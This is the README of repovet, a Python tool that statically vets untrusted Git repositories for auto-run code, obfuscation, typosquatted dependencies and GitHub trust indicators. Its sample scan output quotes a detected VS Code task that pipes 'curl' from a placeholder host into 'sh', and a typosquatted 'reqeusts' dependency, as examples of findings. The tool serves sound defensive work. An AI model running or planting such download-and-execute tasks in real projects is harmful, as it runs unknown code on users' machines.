# repovet

Vet a Git repository before you run it.

repovet statically checks an untrusted Git repository **before** you run, install,
build or open anything from it, and never executes code from it.

It is built around three questions:

| Category   | Question                                                                    |
|------------|-----------------------------------------------------------------------------|
| danger     | Does anything run automatically, or is something hidden, obfuscated or injected? |
| trust      | How do the owner, stars, contributors and maintenance look?                 |
| provenance | What is the repository made of, and how did it come about?                  |

The result is a list of findings plus an honest list of what was **not** checked.
repovet never says that a repository is safe.

## Status

Early: version 0.1.0 is the first release. What works today:

- **Local folders and public GitHub repositories.** A URL like
  `https://github.com/<owner>/<repo>` is fetched into a temporary folder as Git objects
  only (no checkout, nothing from the repository is written under its own file name)
  and deleted after the scan.
- **Reports** for the terminal, as JSON (`docs/report.schema.json`) or as SARIF 2.1.0
  for code-scanning tools.
- **Provenance profile** (facts, not findings): languages, size, largest files,
  top-level structure, usual project files that are present or missing, share of
  generated or vendored files, license (file text and manifest) and notable files such
  as AI agent configuration, dev containers or editor settings. With Git history (a URL
  target, or a local folder with a `.git` folder): commits, time span, authors and
  e-mail domains, signed commits, the share of files that arrived in the first commit
  and AI tools named in commit messages.
- **Provenance indicators** (`info`/`low`, rules `RC-PROV-*`): one large initial commit,
  commit dates in the future or edited, a history rewritten or created in one go, AI
  tool trailers, "generated with" notes and committed AI session histories. They are
  hints about how a repository came about, never a verdict: commit dates and authors
  can be set by anyone.
- **Trust profile** (facts from the GitHub API, see [Trust](#trust-github-api)):
  repository and owner age, account type, stars, forks, watchers, contributors,
  commits, last commit, releases, open issues, archived/fork/template, default-branch
  protection, the license GitHub detects, and for a local folder whether its HEAD
  commit exists in the GitHub repository its Git remote names. `--offline` turns it off.
- **Trust indicators** (`info` to `medium`, rules `RC-TRUST-*`): a very new owner
  account or a very young repository with many stars, most stars within one day, a fork
  of a much more popular repository, a release that offers programs or archives from a
  repository with hardly any code, archived or inactive repositories, a local HEAD that
  GitHub does not know, a manifest that names another owner's repository, and an older,
  more popular repository with the same name and description. They are indicators,
  never a verdict, and there is no score.
- **Danger, six areas:** auto-run code (`autorun`), AI agent instructions and
  configuration (`agents`), obfuscated code (`obfuscation`), download-and-execute
  (`download_exec`), binaries and file-system tricks (`binaries`) and suspicious
  dependencies (`dependencies`); see [What is checked](#what-is-checked).
- Windows, macOS and Linux with Python 3.12 or 3.13; the test suite runs on all three
  in CI.

## Installation

repovet needs Python 3.12 or newer. Install it as a command-line tool in its own
environment with [uv](https://docs.astral.sh/uv/) (uv downloads a matching Python if
needed) or pipx:

```
uv tool install repovet
# or
pipx install repovet

repovet --version
```

Runtime dependencies are PyYAML and [dulwich](https://www.dulwich.io/) (pure-Python
Git, which brings urllib3).

From source, with the exact versions pinned in `uv.lock`:

```
git clone https://github.com/m3xXmo0/repovet.git
cd repovet
uv sync
uv run repovet --version
```

In a source checkout, put `uv run` in front of the commands below.

## Usage

```
repovet scan PATH|URL [options]
```

Examples:

```
# Check a folder you downloaded or cloned
repovet scan D:\downloads\some-repo

# Check a public GitHub repository without cloning it yourself (default branch)
repovet scan https://github.com/pallets/flask

# A branch, a tag or a full commit id; keep the temporary Git objects for a look
repovet scan https://github.com/pallets/flask --ref 3.1.0
repovet scan https://github.com/pallets/flask --ref <40-character commit id> --keep-clone

# Plain output without colors (also set by the NO_COLOR environment variable)
repovet scan ./some-repo --no-color

# Only show high and critical findings
repovet scan ./some-repo --min-severity high

# Exit with 1 already on medium findings (default threshold: high)
repovet scan ./some-repo --fail-on medium

# Also check .venv, venv, node_modules, .tox, .nox and tool caches (skipped by default)
repovet scan ./some-repo --include-env-dirs

# JSON report to stdout, SARIF report into a file (never inside the checked folder)
repovet scan ./some-repo --format json
repovet scan ./some-repo --format sarif -o repovet.sarif

# Skip one rule, check larger files, add your own rules folder
repovet scan ./some-repo --ignore-rule RC-AGENT-001 --max-file-size 8MB --rules ./my-rules

# List the rules, optionally for one area
repovet rules list
repovet rules list --area agents
```

All `scan` options:

| Option                  | Meaning                                                              |
|-------------------------|----------------------------------------------------------------------|
| `--min-severity LEVEL`  | Hide findings below `info`, `low`, `medium`, `high` or `critical` (default: `info`). |
| `--fail-on LEVEL`       | Exit with 1 if a finding has at least this level (default: `high`).  |
| `--ignore-rule ID`      | Do not run this rule (repeatable).                                   |
| `--rules DIR`           | Load additional rules from this folder (repeatable).                 |
| `--max-file-size SIZE`  | Largest file whose content is checked (default: `2MB`).              |
| `--include-env-dirs`    | Also check environment and tool cache folders.                       |
| `--ref REF`             | URL targets: branch, tag or full commit id (default: the default branch). |
| `--keep-clone`          | URL targets: keep the temporary folder with the fetched Git objects; its path is printed. |
| `--max-clone-size SIZE` | URL targets: abort if the download is larger (default: `500MB`).    |
| `--clone-timeout SECONDS` | URL targets: abort the download after this time (default: `300`). |
| `--format FORMAT`       | `text` (default), `json` or `sarif`.                                 |
| `-o`, `--output FILE`   | Write the report to FILE instead of stdout. FILE must be outside the checked folder. |
| `--no-color`            | Plain output without colors.                                         |
| `--offline`             | No GitHub API queries for the trust area (a URL target is still downloaded). |
| `-v`, `--verbose`       | More detail.                                                         |

Rule suppressions and other configuration are only taken from the command line, never
from the checked repository (that content is controlled by whoever wrote the repository).

## Sample output

An excerpt from a real scan of a small test folder (path shortened, the URLs are
placeholders):

```
repovet 0.1.0 | local folder D:\src\demo | offline | 5 files | 126 rules
Lines starting with '>' are untrusted content quoted from the repository.

DANGER                                   1 critical | 2 high | 1 medium
  CRITICAL  RC-AUTO-021   .vscode/tasks.json:7                  confidence high
            Task starts on folder open and fetches or runs code: curl -s
            https://example.invalid/i.sh | sh
            > "command": "curl -s https://example.invalid/i.sh | sh",
            Why  This task starts as soon as the folder is opened in a trusted
                 workspace, and it downloads code, pipes into an interpreter or
                 decodes a payload.
            Do   Do not trust this folder in VS Code. Open it in Restricted
                 Mode or another editor and remove the task before working with
                 it.

  HIGH      RC-DEP-001    requirements.txt:2                  confidence medium
            'reqeusts' looks like the popular package 'requests' (rank 7)
            > reqeusts>=2.31
  ...

NOT CHECKED
  - trust (GitHub API): no GitHub repository is known for this folder (no Git remote in .git/config)
  - Environment and tool cache folders (.venv, venv, node_modules, .tox, .nox, .mypy_cache, .ruff_cache, .pytest_cache) skipped; use --include-env-dirs to check them (1): node_modules
  - No .git folder; the Git history was not checked
  - Dependencies are checked by name and declared source only; their code and install scripts are not checked (no registry queries) (2): package.json, requirements.txt

repovet reports only what its 126 rules detect in the checked scope.
A missing finding is not proof that the repository is safe.
```

Each finding has a rule ID, severity, confidence, file and line (where it applies), the
reason (`Why`) and a recommendation (`Do`). Text quoted from the repository is masked
before output: control characters and invisible Unicode characters are shown as
`<U+XXXX>`, so they cannot change your terminal or mislead a reader.

On a terminal with UTF-8 output, `|` in the header is shown as `·`.

Before "Not checked", the report shows the provenance profile. It describes the
repository; it is not a finding and not a quality score (same demo folder):

```
PROVENANCE PROFILE                       facts, not findings
  Files      5 files, 448 bytes; 5 text files with 22 lines, 0 binary
  Languages  TypeScript 100% (1 file)
  Data, docs JSON (2), Markdown (1), Text (1)
  Largest    .vscode/tasks.json (209 bytes), package.json (118 bytes),
             src/index.ts (47 bytes)
  Top level  .vscode/, src/, package.json, README.md, requirements.txt
  Present    readme
  Missing    license, tests, CI, docs, changelog, contributing guide, security
             policy, code of conduct, code owners, dependency update bot
  License    no license file found
  Notable    editor and IDE settings (1): .vscode/tasks.json
             package manifests (2): package.json, requirements.txt
```

## Trust (GitHub API)

For a GitHub URL, and for a local folder whose `.git/config` names a GitHub repository
as remote `origin` (or as its only remote), repovet asks the GitHub REST API about the
repository and its owner. The trust profile comes before the provenance profile
(excerpt, anonymized):

```
TRUST PROFILE                            facts, not findings
  Repository example-org/example-repo, created 2010-04-06 (16 years ago); last
             push 2026-10-07 (22 days ago)
  Owner      example-org (organization), account created 2016-01-17 (10 years
             ago); 16 public repositories, 2,654 followers
  Popularity 74,935 stars, 17,200 forks, 2,130 watchers
  Activity   5,562 commits on main, last 2026-10-07 (22 days ago); 864
             contributors; 38 releases, latest 3.1.3 on 2026-02-19 (2 assets);
             4 open issues and pull requests
  Status     not archived; not a fork; main is protected; license BSD-3-Clause
             (GitHub); no security policy in the files
  API        6 requests, 52 of 60 left (resets 17:46 UTC), no token
             Stars, forks, followers and accounts can be bought or faked; these
             are indicators, not proof.
```

- **A local folder's remote is only a claim.** Whoever prepared the folder chose it.
  repovet therefore looks up the folder's HEAD commit in that repository (`Local`
  line). GitHub also finds commits that exist only in forks of the repository, so
  "found" is no proof either.
- **Requests:** usually 6 to 8 per scan: repository, owner, commits, contributors,
  latest release, default branch, a name search (only for descriptions of 20 or more
  characters), the local HEAD of a folder, the star times (one or two requests, only for
  50 to 200 stars) and the repository a manifest names (only if it belongs to another
  owner). Counts come from one-item pages, so large repositories cost the same. Each scan stops after 25 requests
  without a token (100 with one) and after 60 seconds.
- **Rate limit:** without a token GitHub allows 60 requests per hour and IP address.
  repovet checks the remaining requests first (that check is free), waits at most 20
  seconds when GitHub asks for a short pause, and otherwise stops and lists what was not
  checked under "Not checked", with the time the limit resets. The scan itself
  continues; the exit code does not change.
- **Token (optional):** set `GITHUB_TOKEN` or `GH_TOKEN` to raise the limit to 5,000
  requests per hour. A fine-grained token without any permissions is enough, because
  only public data is read. The token is sent only to `https://api.github.com`, never
  on the command line, and never appears in reports, error messages or `-v` output.
  The report says only whether a token was used and from which variable.

  ```
  # Bash
  GITHUB_TOKEN=github_pat_... uv run repovet scan https://github.com/pallets/flask

  # PowerShell
  $env:GITHUB_TOKEN = "github_pat_..."; uv run repovet scan https://github.com/pallets/flask
  ```
- **What is not used:** private repositories, GraphQL, the stargazer accounts
  themselves, and any cache (every scan asks again).
- **Limits of the indicators:** the name search looks at the five most starred
  repositories whose name contains the checked name; star times are only fetched for
  50 to 200 stars; only the latest release is looked at; manifests only in the root
  folder. Stars, accounts, dates and descriptions can all be faked.

## JSON and SARIF

- **JSON** (`--format json`): tool, target, scan data, a summary per severity and
  category, the findings, the coverage gaps ("Not checked"), facts (`source` for URL
  targets, `trust` and `provenance` profiles) and the disclaimer. The structure is
  described in
  [docs/report.schema.json](https://github.com/m3xXmo0/repovet/blob/main/docs/report.schema.json)
  (`schema_version` 1.2).
- **SARIF 2.1.0** (`--format sarif`) for GitHub code scanning and SARIF viewers: every
  rule with title, reason, recommendation and `security-severity`; `critical`/`high`
  findings have level `error`, `medium` `warning`, `low`/`info` `note`. Paths are
  relative to `SRCROOT` (the checked folder). Coverage gaps appear as tool execution
  notifications. Findings that concern a whole file point to line 1. The trust and
  provenance profiles are in `runs[0].properties.facts`. For URL targets, `SRCROOT` is the GitHub
  URL of the checked commit.

Both formats contain only ASCII: text from the repository is sanitized like in the
terminal report, and file paths in SARIF are percent-encoded. `--min-severity` filters
both; the exit code never depends on the format.

## What is checked

Severity says how bad it is if the finding means what the rule claims; confidence says
how likely that is. `critical` and `high` mean code runs automatically during normal use
(install, build, opening the folder, starting an agent) or something is clearly
disguised.

[RULES.md](https://github.com/m3xXmo0/repovet/blob/main/RULES.md) lists every rule
with its ID, severity and description; it is generated from the YAML rules in
`src/repovet/rules/`. `repovet rules list` shows the same list in the terminal
(`--area` to pick one area). The rules are grouped in these areas:

| Area | IDs | Looks for |
|------|-----|-----------|
| `autorun` | `RC-AUTO` | code that runs on install, build, opening the folder or a double-click (npm, Python builds, VS Code, dev containers, Git hooks and config, Makefiles, Windows, macOS and Linux shell files, GitHub Actions, MSBuild) |
| `agents` | `RC-AGENT` | instructions and settings for AI coding agents: hidden text, broad permissions, hooks, MCP servers, imports of secrets |
| `obfuscation` | `RC-OBF` | encoded or packed code, invisible characters and look-alike letters in source |
| `download_exec` | `RC-DLX` | code that downloads and runs more code |
| `binaries` | `RC-BIN` | programs, archives, disguised files and file-system tricks |
| `dependencies` | `RC-DEP` | typosquatted names and unusual package sources |
| `provenance` | `RC-PROV` | indicators from languages, structure and Git history |
| `trust` | `RC-TRUST` | indicators from the GitHub API (owner, stars, activity, copies) |

Rules are data, not code: each one is a YAML entry with an ID, severity, confidence,
file patterns, a check, and texts for message, reason and recommendation. Rule IDs are
never renamed or reused.

## Limits: what is not checked

**"No findings" does not mean "safe".** It only means that none of the rules matched
in the part of the repository that was checked. repovet looks for known patterns with
few false alarms; an attacker who knows the rules can avoid them.

Not checked today:

- **Trust** needs the GitHub API: with `--offline`, for a folder without a GitHub
  remote, or when the API cannot be reached or its rate limit is used up, the report
  lists it under "Not checked" (the scan itself continues).
- **Provenance profile:** languages are recognized by file extension or name only, and
  licenses by distinctive phrases of common license texts; neither is a code or legal
  review. A local folder's `.git` folder is not part of the profile.
- **Git history** is read only from a URL clone or a local `.git` folder that has no
  links, no alternates and no `commondir` (otherwise it is listed under "Not checked");
  at most 100,000 commits. Commit dates, authors and trailers are free text chosen by
  whoever commits, so all history facts are indicators. AI indicators only show that a
  tool was named, not who or what wrote the code. SHA-256 repositories and reftable
  refs are not supported.
- **Dependencies** are checked by name and declared source only, offline: names are
  compared with lists of the most downloaded PyPI and npm packages shipped with
  repovet (see `src/repovet/data/SOURCES.md`). The code and install scripts of
  dependencies, known vulnerabilities and transitive dependencies are not checked;
  Rust, Go, Ruby, PHP and Java dependencies are not checked at all.
- **Binary files** are recognized by their signature only: archives are not unpacked,
  programs and documents are not analyzed. Content of Git submodules and Git LFS
  objects is not checked; both are listed under "Not checked".
- **Obfuscation and download-and-execute** are only checked in source and script files
  (not in Markdown, JSON or notebooks), not in test modules (`test_*.py`, `*.test.ts`,
  `testdata/`, `fixtures/`, ...) and, for the noisier rules, not in build output
  (`dist/`, `build/`, `*.min.js`, ...). Code in comment lines is ignored. Downloads
  that are split over several lines or files are not recognized.
- **Auto-run surfaces that are recognized but not analyzed:** Maven, `go:generate`,
  CMake, JetBrains `.idea/` settings. Others are only partly checked: GitHub Actions
  workflows for `pull_request_target` checkouts and encoded commands, MSBuild files for
  `Exec`, `DownloadFile` and inline tasks, Rust `build.rs` for network access, Composer
  for install hooks and downloads, Gradle for external commands, downloads and the
  wrapper URL, Ruby gemspecs, Rakefiles and Gemfiles for native extensions and
  downloads. If present, they are listed under "Not checked".
- **URL targets:** only public repositories on `https://github.com/<owner>/<repo>`;
  other hosts and SSH, `git://` or `file://` URLs are rejected. Git submodules are
  listed, never fetched. The default limits are 500 MB download and 300 seconds.
- **Skipped files:** files larger than `--max-file-size` (default 2 MB), environment and
  tool cache folders unless `--include-env-dirs` is given, symlinks and junctions (listed,
  never followed), files that cannot be read or parsed. All of them appear under
  "Not checked".
- **Line numbers** in JSON, TOML and YAML files are best effort.
- **Out of scope by design:** running, sandboxing or dynamic analysis of repository code;
  known vulnerabilities (CVE) in dependencies (use pip-audit, npm audit or OSV-Scanner);
  leaked secrets; antivirus signatures; a total score or a safe/unsafe verdict.

Read the "Not checked" section of every report. Gaps in coverage do not change the exit
code.

## Security model

- **Nothing from the checked repository is executed:** no scripts, hooks, builds, package
  managers or imports. Python files are only parsed with `ast.parse`; YAML is only read
  with a safe loader with size and alias limits. Ruff rules (`banned-api`,
  flake8-bandit) and a self-check test forbid `subprocess`, `os.system`, `eval`, `exec`,
  `pickle` and similar in repovet's own code.
- **Offline analysis:** the analysis of files and history makes no network connections.
  There are only two: for a URL target the HTTPS download from github.com (TLS
  verified, no Git configuration, credential helpers or stored passwords are used),
  and for the trust area HTTPS requests to `api.github.com` only (no other host, no
  redirect elsewhere, at most 1 MiB per answer, a fixed request budget per scan).
  `--offline` switches the API off; a local folder with `--offline` makes no
  connection at all. The test suite blocks sockets to make sure of that; API tests use
  recorded answers, and the clone tests use a local Git server on 127.0.0.1 only.
- **Read-only:** files are only opened for reading; nothing in the checked folder is
  changed. Symlinks, junctions and reparse points are not followed. Inside `.git/`, only
  `config`, `hooks/*` and `info/attributes` are read, as plain files.
- **No `git` binary:** repovet never calls `git`, so Git configuration in the checked
  repository (for example `core.fsmonitor`, filters or pagers) can never run. GitHub
  URLs are fetched with [dulwich](https://www.dulwich.io/), a pure-Python Git
  implementation: only the pack file is downloaded into a fresh temporary folder (no
  working tree, refs, hooks, submodules, LFS or filters), and files are read from the
  Git objects in memory. Object sizes are checked before anything is unpacked, so a
  small download cannot inflate into gigabytes. The folder is deleted after the scan.

Found a way to break one of these guarantees? Please report it privately, as described
in [SECURITY.md](https://github.com/m3xXmo0/repovet/blob/main/SECURITY.md).

## Exit codes

The exit codes are a stable interface for scripts and CI:

| Code | Meaning                                                                         |
|------|---------------------------------------------------------------------------------|
| 0    | No findings at or above `--fail-on` (this does not mean the repository is safe) |
| 1    | At least one finding at or above `--fail-on`                                     |
| 2    | Usage error: invalid arguments, target not found, invalid rules file, unsupported URL |
| 3    | Analysis aborted: download failed or hit a limit, internal error, interruption   |

## Development

```
uv sync                      # create .venv with the pinned dev tools
uv run pytest                # all tests
uv run mypy                  # strict type check of src and tests
uv run ruff check            # lint, including security rules
uv run ruff format --check   # formatting
```

All four must pass before a change is done. `uv run pytest -m "not slow"` skips the
performance test (10,000 generated files).

Every rule has at least one positive and one harmless test case in
`tests/rule_cases/*.yaml`; a meta test fails otherwise. Test fixtures are written to a
temporary folder only during the test, and every regular expression is tested against
pathological inputs (ReDoS).

After changing rules, regenerate the tables in
[RULES.md](https://github.com/m3xXmo0/repovet/blob/main/RULES.md) with
`uv run repovet rules list --markdown` and paste them between the `rules-table`
markers; `tests/test_readme.py` checks it.

**False-positive corpus:** `tests/corpus/corpus.yaml` lists real open-source
repositories pinned to a commit (each one can also be checked by URL, see the corpus
README). `tests/test_corpus.py` scans each and fails on high or critical findings that
are not explicitly accepted. Tests never download anything, so the test is skipped
unless `REPOVET_CORPUS_DIR` points to the extracted repositories. See
[tests/corpus/README.md](https://github.com/m3xXmo0/repovet/blob/main/tests/corpus/README.md)
for downloading and running it:

```
# Bash
REPOVET_CORPUS_DIR=/path/to/corpus uv run pytest -m corpus

# PowerShell
$env:REPOVET_CORPUS_DIR = "C:\path\to\corpus"; uv run pytest -m corpus
```

## Roadmap

Changes per version are listed in
[CHANGELOG.md](https://github.com/m3xXmo0/repovet/blob/main/CHANGELOG.md). Possible
next steps, without dates: Maven (`pom.xml`), Python 3.14 in CI, and an optional
online lookup of known malicious packages.

## License

MIT, see [LICENSE](https://github.com/m3xXmo0/repovet/blob/main/LICENSE).
Copyright (c) 2026 m3xXmo0.

repovet ships two lists of package names as data (see
`src/repovet/data/SOURCES.md`): the most downloaded PyPI projects from
"top-pypi-packages" by Hugo van Kemenade (CC BY 4.0), and the most downloaded npm
packages from npm-high-impact by Titus Wormer (MIT).
